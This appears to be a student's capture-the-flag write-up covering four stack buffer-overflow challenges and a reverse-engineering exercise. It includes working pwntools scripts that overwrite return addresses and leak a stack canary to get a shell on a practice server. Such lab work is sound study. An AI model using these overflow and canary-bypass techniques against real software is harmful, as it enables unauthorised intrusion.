jump
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1qdW1wIiwiaXAiOiIxMjMuMjQzLjYuMTM2Iiwic2Vzc2lvbiI6IjZmNzJjYmY4LTBkNzktNDU0YS05ODEwLTVmMGU3ZDE4MGU3OCJ9.UrlPYZFEOL-7fN2XrQEN4PEaUfNviWzqhjUswrs90Cw}

General overview of problems faced
-------------------------------------
Using pwndbg, I used the command cyclic 100 to create an input sequence, 
and then entered this as input into gets. This overflows the buffer and overwrites
the address that we eventually jump to

Since the binary prints the address of the function we are about to jump to, 
we can see the value we have written here is 0x61616171, or 'qaaa'.
Using cyclic -l 0x61616171 gives the result 64, which tells us the address 
for the function we jump to is stored at an offset of 64 bytes (immediately after the buffer ends)

Hence, we want to pass 64 bytes of anything followed by the address of the 'win' function

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 2001)

# To begin, the binary prints the address of the winning function, so we want to extract and store this for later. 
p.recvuntil("at ")
win = int(p.recvline()[:-1], 0)

# We then send a byte string where the first 64 characters are anything, and then after this we pack a 32 bit value with the function address.
p.sendline(flat({
  64: p32(win)
  }))

# Rather than have p.interactive() at the end of the script and then manually get the flag in the terminal, we can simply send the command 'cat flag' within the script to make it fully automated
p.recvuntil("flow\n")
p.sendline("cat flag")
flag = p.recvuntil("}")
print(flag)
```

blind
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1ibGluZCIsImlwIjoiMTIzLjI0My42LjEzNiIsInNlc3Npb24iOiJjOGY1NjI0NS1hNTViLTQ0NGQtYjE5Ni01ZmMzZWQ0MWM5OGYifQ.W4TJtubzXeNSYgCO-RTPOjzmm6d9ts2nJ-9ciklrxIc}

General overview of problems faced
-------------------------------------
To begin, we use pwndbg's cyclic 100 command to generate an input sequence for our buffer overflow.

Then, when the function tries to return, the EIP register (which holds the return address) is invalid, so pwndbg states 'Invalid address 0x61616173'.

To determine what offset this value 0x61616173 is within our sequence, we use the command cyclic -l 0x61616173, which gives us 72. 

Hence, we need 72 bytes of anything followed by the address of the function we want to return to once the current function is complete (instead of simply returning back to main)

To determine the address of the 'win' function we want to jump to, I opened the binary in binary ninja, selected the 'win' function from the list of symbols, and then on the bottom right of the screen it gives the address of this function as 0x80484d6

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 2002)

# We simply send a byte string where the first 72 characters are anything, and then the address of the 'win' function that we want to return to
p.sendline(flat({
  72: p32(0x80484d6)
  }))

# we then have access to the shell
p.interactive()
```

bestsecurity
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjEyMy4yNDMuNi4xMzYiLCJzZXNzaW9uIjoiODUyMTU2NGYtN2FiYy00MTdlLWEwOWQtOGYwOGQ1NjQwOTVkIn0.70GyCjfI-iA6eIaZ_AMTY7MoAF2Ao_Qu8FboEOiakhw}

General overview of problems faced
-------------------------------------
Since there is no source code, I first opened binary ninja to get a better understanding of what the program does. The main function simply calls the 'check_canary' function. In 'check_canary', two values are compared using strncmp, and if they are equal I get shell access.

The first value pushed to be compared is at address 0x804a00c, which we know holds the value "1234" from the binary ninja comment. The other value pushed is what is in register eax, which we can see from the binary ninja comment is at address 'var_9'. When binary ninja gives the label 'var_9', this means it is stored 9 bytes above (or before) the return address stored in the EIP register.

Hence, to overwrite the second value pushed to strncmp to be equal to "1234", we need to determine the offset of the return address from our buffer, and then relative to the return addresses position insert the string "1234" 9 bytes before.

To determine the offset the return address in EIP is from our buffer, we use cyclic 300 in pwndbg. Then, we input this sequence when gets asks for input. When we run the rest of the binary, it tries to return to an overwritten address and displays 'Invalid address 0x6b626161'. When doing cyclic -l 0x6b626161, we get the result 137, which tells us the return address has an offset of 137 bytes.

Hence, since the value we want to overwrite is 9 bytes above the return address, we can write 137 - 9 = 128 bytes of anything, followed by the string "1234" to match the other stored value.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 2003)

# The byte string we send as input to gets is 128 bytes of anything followed by the string 1234
p.sendline(flat({
  128: "1234"
  }))

# and once we have access to the shell, we can retrieve the flag in the terminal
p.interactive()
```

stack-dump
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1zdGFjay1kdW1wIiwiaXAiOiIxMjMuMjQzLjYuMTM2Iiwic2Vzc2lvbiI6ImEzN2RiYjJlLTZiOTktNDAyZi1iNzU1LWIwOWVmZTY1NDFiMyJ9.Y30tsyjdIh1EY-Ik85yIaI2K7ecK1RiOlhkCsQYC0hU}

General overview of problems faced
-------------------------------------
This program first provides a 'useful stack pointer'. Whilst I was initially confused about what was at this address, I eventually realised it was the start of a buffer.

We are then presented with four commands we can use. The first 'input data' allows me to pass in data to this buffer mentioned above. The second command 'dump memory' reads from this same buffer we wrote to, and if given an address it prints the contents of this address. The third option 'print memory map' shows the location of the stack, heap etc., and the final option 'quit' returns from main.

Through looking in binary ninja, I found a function called 'win' at location 0x80486c6 (bottom right of binary ninja for address) which provides shell access. Hence, I determined like earlier challenges that I would want to create a buffer overflow to overwrite the return address to jump to 'win'.

However, when we perform a buffer overflow as usual to determine the location of the return address, we get the prompt 'stack smashing detected', which suggests a stack canary exists. This means we will first have to leak the value of the canary, and only then can we do the buffer overflow (ensuring that we maintain the canary when doing so).

To first leak the canary value, we need to determine its address. Whilst using the command 'canary' in pwndbg can give us this (as well as its value), since the addresses on the stack change each time I run the program, I actually need the canarys address relative to my buffer.

When looking in binary ninja, we can see at the start of main a value is copied from the gs register onto the stack at address ebp-0x8. This is actually the canary, and from this we can gather it is 8 bytes below/before the EBP register.

To determine where EBP is in relation to the buffer, I ran the program in pwndbg, which provided me with the address for both the ESP and EBP. Using all these addresses, I could construct the following map of the stack:

0...
0xffffce18 - ESP
0xffffce27 - Buffer
0xffffce90 - Canary (8 bytes below EBP as found earlier)
0xffffce98 - EBP
0xffffce9c - EIP (since EBP is 4 bytes long, EIP must be 4 bytes above it)
ffff...

Given the address for the buffer and the canary (in this instance), we can calculate that there is an offset of 105 bytes. So, we extract the address of the buffer from the programs output, add 105 to it, and then we give this address as input to the command 'input data'. This places the address into the buffer, and then command 'dump memory' will print the contents of this address, being the value of the canary.

We can then extract this, and construct our buffer overflow to include it so it does not appear to be overwritten. Our buffer overflow will be 96 bytes of anything, then the canary, then 8 bytes of anything, and then the address of the win function. We pass this payload into the 'input data' command, and then when we use the 'quit' command, we are given shell access as desired.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 2004)

# We want to extract the 'useful stack pointer', which is the address of the buffer
p.recvuntil("pointer ")
useful = int(p.recvline()[:-1], 0)

# Since we know the canary is stored 105 bytes above the buffer, we add this offset to the buffers address
canaryAddress = useful + 105

# We then select command 'input data' and send the address of the canary as input
p.sendline("a")
p.sendline(p32(canaryAddress))

# We use command 'dump memory' to display the contents of this address, here being the stack canary value.
p.sendline("b")

# Here we extract the canary value given by the program
p.recvuntil("memory at ")
p.recvuntil(": ")
canaryValue = u32(p.recv(4))

# Since we found the address of the win function in binary ninja, we store it in a variable to be used in the buffer overflow
win = int("0x80486c6", 0)

# We use command 'input data' to send through our buffer overflow, which is 96 bytes of anything, the canary, 8 bytes of anything, and the address of the win function
p.sendline("a")
p.sendline(b"A"*96 + p32(canaryValue) + b"A"*8 + p32(win))

# We then use command 'quit' to return to the win function which gives us shell access
p.sendline("d")
p.interactive()
```

re challenge (chall1)
=============
General overview of problems faced
-------------------------------------
To reverse engineer this function into C code, I simply worked may way through the assembly instructions. The first area of note is the call to scanf. We can see that
the address of a variable is passed into it, alongside the value "%d". Hence, I simply created a variable 'a' to represent this.

Next, the value of this variable 'a' is compared with the value 0x539, which is equivalent to the int 1337. If this comparison gives a result that isn't equal to zero, meaning 'a' doesn't equal 1337, then puts is called with the input "Bye". Alternatively, if 'a' does equal 1337, it calls puts with the input "Your so leet!".

Finally, the value 1 is moved into eax, and then the function returns, meaning the function returns 1. Also I wasn't sure if it was necessary to include stdio such that scanf will work, but I did so anyway.

```C
#include <stdio.h>

int main(int argc, char** argv) {

  int a;
  scanf("%d", &a);

  if (a == 1337) {
    puts("Your so leet!");
  } else {
    puts("Bye");
  }

  return 1;
}
```
